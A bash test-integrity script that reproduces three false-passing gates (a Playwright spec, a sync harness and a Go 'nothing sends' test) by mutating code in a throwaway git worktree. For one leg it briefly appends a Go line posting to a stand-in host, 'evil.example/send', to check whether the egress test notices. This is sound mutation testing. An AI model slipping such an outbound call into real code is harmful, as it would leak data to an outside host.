#!/usr/bin/env bash
# 01-false-gates-pass-against-inverted-code.sh — spike for card I1 (test-integrity-fix,
# triage 20261002 / ledger T-62): the card's red-first baseline. Three gates on today's
# `dev` are claimed to pass against inverted or widened production code:
#   (a) B-465  tests/marketing.spec.js: with `failClosed` INVERTED in marketing/submit-flow.js,
#              `[SP-03]` goes red but `[SP-03b]` stays green (the control, unmutated: 2 passed).
#   (b) B-462  marketing/sync/harness/campaigns-run.sh exits 0 against the SAME inversion —
#              leg 3 asserts a hand-copied `failClosed`, never the shipped one.
#   (c) B-466  backend TestNothingInThisPackageSends still PASSES after an `http.Post(...)`
#              is added to campaigns.go — it scans subscribers.go + sources/*.go only.
# Every mutation happens in a THROWAWAY git worktree off `dev`; the main tree is never
# touched. Spike-owned coordinates: TEST_DB_NAME=hq_test_spike_i1_20261003, TEST_PORT=8311,
# Go DB hq_test_spike_i1_go — all on :5434 (yumyums-test-pg, role hqtest). NEVER :5433.
#
# 🛑 THE VERDICT IS THIS SCRIPT'S EXIT STATUS, NEVER ITS PROSE.
#   exit 0  all three false gates reproduce exactly as the ledger states (premise proven)
#   exit 1  a gate did NOT behave as stated — prints "🛑 VERDICT: RED"
#   exit 2  could not run (precondition missing; nothing was measured)
set -euo pipefail
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd -- "$SCRIPT_DIR/../../../.." && pwd)"
WT="$(dirname -- "$REPO_ROOT")/hq-worktrees/spike-i1-20261003"
PW_DB="hq_test_spike_i1_20261003"
GO_DB="hq_test_spike_i1_go"
PW_PORT="8311"
PG=(psql -h localhost -p 5434 -U hqtest -d postgres -v ON_ERROR_STOP=1 -qtA)
export PGPASSWORD="${PGPASSWORD:-hqtest}"
export PATH="/usr/local/go/bin:$PATH"
LOG="${SPIKE_LOG_DIR:-$(mktemp -d /tmp/spike-i1.XXXXXX)}"
T0=$(date +%s)

fail()       { printf '\n🛑 VERDICT: RED — %s\n' "$1" >&2; exit 1; }
cannot_run() { printf '\n⚠ COULD-NOT-RUN — %s\n' "$1" >&2; exit 2; }
leg()        { printf '\n── %s ──\n' "$1"; }
exitline()   { printf '#   %-52s exit=%s  (expected %s)\n' "$1" "$2" "$3"; }

# ── cleanup runs on EVERY exit path: worktree gone, scratch DBs dropped ──────
cleanup() {
  local rc=$?
  set +e
  if [ -d "$WT" ]; then
    git -C "$REPO_ROOT" worktree remove --force "$WT" >/dev/null 2>&1 || rm -rf "$WT"
    git -C "$REPO_ROOT" worktree prune >/dev/null 2>&1
  fi
  "${PG[@]}" -c "drop database if exists $PW_DB with (force)" >/dev/null 2>&1
  "${PG[@]}" -c "drop database if exists $GO_DB with (force)" >/dev/null 2>&1
  printf '# cleanup: worktree %s removed=%s; %s and %s dropped; logs in %s; wall-clock %ss\n' \
    "$WT" "$([ -d "$WT" ] && echo no || echo yes)" "$PW_DB" "$GO_DB" "$LOG" "$(( $(date +%s) - T0 ))"
  exit "$rc"
}
trap cleanup EXIT

# ── preconditions ────────────────────────────────────────────────────────────
command -v go   >/dev/null || cannot_run "go not on PATH (export PATH=/usr/local/go/bin:\$PATH)"
command -v node >/dev/null || cannot_run "node not on PATH"
command -v psql >/dev/null || cannot_run "psql not on PATH"
command -v docker >/dev/null || cannot_run "docker not on PATH (the harness leg needs the spike-supabase substrate)"
[ -d "$REPO_ROOT/node_modules/@playwright" ] || cannot_run "no node_modules in $REPO_ROOT (npm ci first)"
[ -e "$REPO_ROOT/.night-crew/qa/spike-supabase/rxdb/node_modules/rxdb" ] || cannot_run "no vendored rxdb under .night-crew/qa/spike-supabase/rxdb/node_modules"
"${PG[@]}" -c 'select 1' >/dev/null 2>&1 || cannot_run "yumyums-test-pg (:5434, role hqtest) not reachable — task test:db:up"
git -C "$REPO_ROOT" rev-parse --verify -q dev >/dev/null || cannot_run "no local branch 'dev'"
if ss -ltn 2>/dev/null | grep -q ":$PW_PORT "; then cannot_run "port $PW_PORT already in use"; fi
docker compose -p spike-supabase ps -q db 2>/dev/null | grep -q . || cannot_run "spike-supabase substrate is not up (env-up.sh, no --fresh)"

echo "# target coordinates (read-only statement before any write):"
echo "#   worktree   : $WT  (detached, off $(git -C "$REPO_ROOT" rev-parse --short dev) = dev)"
echo "#   playwright : TEST_DB_NAME=$PW_DB TEST_PORT=$PW_PORT  on :5434/hqtest"
echo "#   go         : DB_TEST_URL=postgres://hqtest:***@localhost:5434/$GO_DB"
echo "#   substrate  : spike-supabase compose project, RECONCILE mode (campaigns-run.sh owns it)"
echo "#   logs       : $LOG"

# ── throwaway worktree ───────────────────────────────────────────────────────
leg "worktree"
if [ -d "$WT" ]; then
  echo "#   a stale $WT exists — removing it first"
  git -C "$REPO_ROOT" worktree remove --force "$WT" 2>/dev/null || rm -rf "$WT"
  git -C "$REPO_ROOT" worktree prune
fi
git -C "$REPO_ROOT" worktree add --detach "$WT" dev >/dev/null
ln -s "$REPO_ROOT/node_modules" "$WT/node_modules"
ln -s "$REPO_ROOT/marketing/sync/harness/node_modules" "$WT/marketing/sync/harness/node_modules"
ln -s "$REPO_ROOT/.night-crew/qa/spike-supabase/rxdb/node_modules" "$WT/.night-crew/qa/spike-supabase/rxdb/node_modules"
echo "#   HEAD=$(git -C "$WT" rev-parse --short HEAD); node_modules symlinked (root, harness, qa/rxdb)"

# ── warm the backend build OUTSIDE Playwright's 60s webServer window ────────────
# 2026-10-03: the control leg timed out ("Timed out waiting 60000ms from
# config.webServer") because this was the first compile of the server since the
# 20261002 merge, cold, in a fresh worktree, 14s after `task spike:up` loaded the
# box — 371 build-cache objects written inside the window, the server's first log
# line never reached Playwright. Warm by hand, in the worktree, so the webServer
# command only has to LINK and start. Same tree, same cache key; not a mutation.
leg "warm build (backend, in the worktree)"
( cd "$WT/backend" && go build -o /dev/null ./cmd/server/ ) \
  || cannot_run "backend did not compile in the worktree — see output above"
echo "#   backend compiled; build cache warm for the Playwright legs"
MAIN_SHA="$(git -C "$REPO_ROOT" rev-parse HEAD)"

# Per-spec outcome from Playwright's JSON reporter — the line reporter's totals
# fold a red into "1 failed" without naming it, and retries blur it further.
pw_run() { # $1=label ; runs SP-03 + SP-03b in the worktree, writes $LOG/$1.json + .log, echoes exit
  local label="$1" rc=0
  ( cd "$WT" && TEST_DB_NAME="$PW_DB" TEST_PORT="$PW_PORT" PLAYWRIGHT_JSON_OUTPUT_NAME="$LOG/$label.json" \
      npx playwright test tests/marketing.spec.js -g "SP-03" --retries=0 --reporter=line,json ) >"$LOG/$label.log" 2>&1 || rc=$?
  echo "$rc"
}
pw_outcomes() { # $1=label → prints "title=ok" lines (ok true/false), one per spec
  node -e '
    const r = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
    const out = [];
    const walk = (s) => { (s.specs||[]).forEach(sp => out.push(`${sp.title.match(/\[SP-03b?\]/)?.[0] ?? sp.title}=${sp.ok}`)); (s.suites||[]).forEach(walk); };
    (r.suites||[]).forEach(walk);
    console.log(out.join("\n"));
  ' "$LOG/$1.json"
}
has() { grep -qxF -- "$2" <<<"$1"; }  # -F: the titles carry [brackets]

# ── leg (a) control: unmutated tree → 2 passed ──────────────────────────────
leg "leg (a) control — [SP-03] + [SP-03b] against the UNMUTATED worktree"
RC_A0="$(pw_run a-control)"
OUT_A0="$(pw_outcomes a-control 2>/dev/null || true)"
grep -E "passed|failed|flaky|Error" "$LOG/a-control.log" | tail -3 | sed 's/^/#   /'
exitline "playwright (control)" "$RC_A0" "0"
[ -s "$LOG/a-control.json" ] || cannot_run "no Playwright JSON — the stack did not come up; see $LOG/a-control.log"
[ "$(wc -l <<<"$OUT_A0")" = "2" ] || cannot_run "expected exactly 2 specs for -g SP-03, got: $(tr '\n' ' ' <<<"$OUT_A0")"
has "$OUT_A0" "[SP-03]=true"  || fail "control: [SP-03] is red on an unmutated tree — baseline is not green"
has "$OUT_A0" "[SP-03b]=true" || fail "control: [SP-03b] is red on an unmutated tree — baseline is not green"
[ "$RC_A0" = "0" ] || fail "control: playwright exit $RC_A0 with both specs ok=true"
echo "#   control: [SP-03]=pass [SP-03b]=pass"

# ── invert failClosed in the worktree's submit-flow.js ──────────────────────
leg "mutate — invert failClosed in $WT/marketing/submit-flow.js"
perl -0pi -e 's/(function failClosed\(campaignId\) \{\n\s*)return !namesNoCampaign\(campaignId\);/$1return namesNoCampaign(campaignId);/' "$WT/marketing/submit-flow.js"
git -C "$WT" diff --stat -- marketing/submit-flow.js | sed 's/^/#   /'
git -C "$WT" diff -U0 -- marketing/submit-flow.js | grep -E '^[-+]\s+return' | sed 's/^/#   /'
[ "$(git -C "$WT" diff --numstat -- marketing/submit-flow.js | awk '{print $1"/"$2}')" = "1/1" ] || cannot_run "inversion did not apply as exactly one changed line"

# ── leg (a) mutated: [SP-03] red, [SP-03b] still green ──────────────────────
leg "leg (a) — the same two specs against the INVERTED failClosed"
RC_A1="$(pw_run a-inverted)"
OUT_A1="$(pw_outcomes a-inverted 2>/dev/null || true)"
grep -E "passed|failed|flaky|✘|✓" "$LOG/a-inverted.log" | tail -4 | sed 's/^/#   /'
exitline "playwright (inverted failClosed)" "$RC_A1" "1"
[ -s "$LOG/a-inverted.json" ] || cannot_run "no Playwright JSON on the mutated run; see $LOG/a-inverted.log"
has "$OUT_A1" "[SP-03]=false" || fail "[SP-03] did NOT go red against the inverted failClosed (got: $(tr '\n' ' ' <<<"$OUT_A1"))"
has "$OUT_A1" "[SP-03b]=true" || fail "[SP-03b] went red against the inverted failClosed — it DOES consult the predicate; B-465's premise is wrong (got: $(tr '\n' ' ' <<<"$OUT_A1"))"
[ "$RC_A1" != "0" ] || fail "playwright exited 0 with [SP-03] red"
echo "#   inverted: [SP-03]=FAIL (honest) [SP-03b]=pass (the false gate — B-465 reproduced)"

# ── leg (b): campaigns-run.sh exits 0 against the same inversion ────────────
leg "leg (b) — marketing/sync/harness/campaigns-run.sh with failClosed STILL inverted"
N_IMPORT="$(grep -c "submit-flow" "$WT/marketing/sync/harness/campaigns-harness.mjs" || true)"
echo "#   static: campaigns-harness.mjs references 'submit-flow' $N_IMPORT time(s) in code or comments;"
echo "#           import lines naming it: $(grep -cE "^\s*import .*submit-flow|import\(.*submit-flow" "$WT/marketing/sync/harness/campaigns-harness.mjs" || true)"
grep -nE "^const failClosed|^function policyFor" "$WT/marketing/sync/harness/campaigns-harness.mjs" | sed 's/^/#           own copy at line /'
RC_B=0
bash "$WT/marketing/sync/harness/campaigns-run.sh" >"$LOG/b-harness.log" 2>&1 || RC_B=$?
grep -E "VERDICT|RED:|leg 3|COULD-NOT-RUN" "$LOG/b-harness.log" | tail -4 | sed 's/^/#   /'
exitline "campaigns-run.sh (inverted failClosed)" "$RC_B" "0"
[ "$RC_B" != "2" ] || cannot_run "campaigns-run.sh could not run (substrate); see $LOG/b-harness.log"
[ "$RC_B" = "0" ] || fail "campaigns-run.sh exited $RC_B against the inverted failClosed — leg 3 DOES see the shipped predicate; B-462's premise is wrong"
echo "#   harness GREEN against inverted production code (the false gate — B-462 reproduced)"

# ── restore submit-flow.js ──────────────────────────────────────────────────
leg "restore — git checkout -- marketing/submit-flow.js (worktree only)"
git -C "$WT" checkout -- marketing/submit-flow.js
[ -z "$(git -C "$WT" status --porcelain -- marketing)" ] || cannot_run "worktree marketing/ not clean after restore"
echo "#   worktree clean under marketing/"

# ── leg (c): TestNothingInThisPackageSends vs an http.Post in campaigns.go ──
leg "leg (c) — TestNothingInThisPackageSends, control then with http.Post added to campaigns.go"
"${PG[@]}" -c "drop database if exists $GO_DB with (force)" >/dev/null
"${PG[@]}" -c "create database $GO_DB" >/dev/null
GO_URL="postgres://hqtest:hqtest@localhost:5434/$GO_DB?sslmode=disable"
go_run() { # $1=label → echoes exit
  local rc=0
  ( cd "$WT/backend" && DB_TEST_URL="$GO_URL" go test ./internal/marketing -run 'TestNothingInThisPackageSends' -count=1 -v ) >"$LOG/$1.log" 2>&1 || rc=$?
  echo "$rc"
}
RC_C0="$(go_run c-control)"
grep -E "^(--- |=== RUN|ok|FAIL|PASS)" "$LOG/c-control.log" | tail -3 | sed 's/^/#   /'
exitline "go test (control)" "$RC_C0" "0"
grep -q "^--- PASS: TestNothingInThisPackageSends" "$LOG/c-control.log" || cannot_run "control did not run/pass TestNothingInThisPackageSends (DB? build?); see $LOG/c-control.log"

printf '\n// spike I1: outbound HTTP on the campaigns path — the gate must NOT see this.\nfunc spikeEgress() { _, _ = http.Post("https://evil.example/send", "text/plain", nil) }\n' >> "$WT/backend/internal/marketing/campaigns.go"
grep -n "spikeEgress" "$WT/backend/internal/marketing/campaigns.go" | sed 's/^/#   campaigns.go:/'
RC_C1="$(go_run c-egress)"
grep -E "^(--- |ok|FAIL|PASS)|campaigns.go" "$LOG/c-egress.log" | tail -4 | sed 's/^/#   /'
exitline "go test (http.Post in campaigns.go)" "$RC_C1" "0"
if grep -q "^\[build failed\]\|cannot find\|undefined:" "$LOG/c-egress.log"; then cannot_run "the mutated package did not compile; see $LOG/c-egress.log"; fi
grep -q "^--- PASS: TestNothingInThisPackageSends" "$LOG/c-egress.log" \
  || fail "TestNothingInThisPackageSends went RED with http.Post in campaigns.go — the gate DOES scan campaigns.go; B-466's premise is wrong"
[ "$RC_C1" = "0" ] || fail "go test exited $RC_C1 although the test reported PASS"
git -C "$WT" checkout -- backend/internal/marketing/campaigns.go
echo "#   PASS with outbound HTTP in campaigns.go (the false gate — B-466 reproduced); file restored"

# ── main tree untouched ─────────────────────────────────────────────────────
[ "$(git -C "$REPO_ROOT" rev-parse HEAD)" = "$MAIN_SHA" ] || fail "main tree HEAD moved during the spike"
[ -z "$(git -C "$REPO_ROOT" status --porcelain -- marketing backend)" ] || fail "main tree marketing/ or backend/ is dirty — a mutation escaped the worktree"

echo
echo "✅ GREEN — three false gates reproduced by execution on dev@$(git -C "$REPO_ROOT" rev-parse --short dev):"
echo "   (a) [SP-03b] green vs inverted failClosed (B-465)   (b) campaigns-run.sh exit 0 vs the same inversion (B-462)"
echo "   (c) TestNothingInThisPackageSends PASS vs http.Post in campaigns.go (B-466). Card I1's red-first baseline stands."
